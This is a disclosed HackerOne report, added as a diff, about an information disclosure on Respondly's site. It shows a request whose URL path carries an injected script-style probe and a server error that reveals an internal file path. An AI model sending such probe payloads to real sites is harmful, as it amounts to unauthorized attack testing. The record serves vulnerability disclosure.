@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/9137
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/mohamed_fouad
+ReportedTo:Respondly(respondly)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:23.04.2014 4:46:30
+
+Summary:
+
+{"code":500,"error":"Failed to render CSS stylesheet.","file":"/assets/packages/app/shared/css/","message":"ENOENT, open '/srv/www/respondly/releases/20140421220734/marketing_bundle/programs/server/assets/packages/app/shared/css/"}
+
+Request
+------------
+GET /css/shared/%22ns=%22alert(9) HTTP/1.1
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;)
+Accept-Language: en-us,en;q=0.5
+Host: respond.ly
+Accept-Encoding: gzip, deflate
+
+Response
+--------------
+HTTP/1.1 500 Internal Server Error
+Connection: keep-alive
+Date: Tue, 22 Apr 2014 16:36:00 GMT
+Transfer-Encoding: chunked
+Server: nginx
+Vary: Accept-Encoding
+X-Frame-Options: DENY
+Content-Type: application/json
+
+{"code":500,"error":"Failed to render CSS stylesheet.","file":"/assets/packages/app/shared/css/","message":"ENOENT, open '/srv/www/respondly/releases/20140421220734/marketing_bundle/programs/server/assets/packages/app/shared/css/"}
